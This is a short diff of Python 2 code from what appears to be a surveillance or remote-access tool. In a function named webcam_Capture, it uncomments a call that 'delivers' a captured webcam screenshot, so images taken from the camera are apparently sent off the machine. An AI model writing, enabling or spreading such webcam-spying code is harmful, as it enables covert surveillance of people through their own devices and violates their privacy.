@@ -977,7 +977,7 @@ def webcam_Capture():
 		cap.release()
 		cv2.destroyAllWindows()
 		# Deliver web cam screenshot...
-		#Downloader(envoDr)
+		Downloader(envoDr)
 		print "Web cam screenshot delivered!"
 	elif(platform.system()=="Windows"):
 		print "Windows OS Detected!"
